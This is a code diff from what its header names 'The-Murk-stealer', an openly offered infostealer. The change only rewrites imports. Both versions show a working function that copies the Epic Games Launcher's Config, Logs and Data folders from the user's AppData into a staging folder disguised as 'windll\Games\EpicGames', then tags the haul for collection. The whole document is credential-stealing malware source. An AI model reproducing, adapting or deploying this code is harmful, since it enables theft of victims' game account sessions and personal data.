@@ -10,8 +10,8 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
-import shutil
+from os import environ,sep
+from shutil import copytree
 """
 all needed paths
 """
@@ -22,12 +22,12 @@ path2 = r'EpicGamesLauncher\Saved\Data'
 
 def Epic(data):
     try:
-        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        user = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
+        user = environ['USERPROFILE'] + sep + r'AppData\Local'
         #os.makedirs(r'C:\windll\EpicGames')
-        shutil.copytree(user+ os.sep + path,rf'{pathtofile}\windll\Games\EpicGames\Config')# copy dirs
-        shutil.copytree(user+ os.sep + path1,rf'{pathtofile}\windll\Games\EpicGames\Logs')
-        shutil.copytree(user+ os.sep + path2,rf'{pathtofile}\windll\Games\EpicGames\Data')
+        copytree(user+ sep + path,rf'{pathtofile}\windll\Games\EpicGames\Config')# copy dirs
+        copytree(user+ sep + path1,rf'{pathtofile}\windll\Games\EpicGames\Logs')
+        copytree(user+ sep + path2,rf'{pathtofile}\windll\Games\EpicGames\Data')
         data.append("\n∟🎮EpicGames")
         return data
     except:
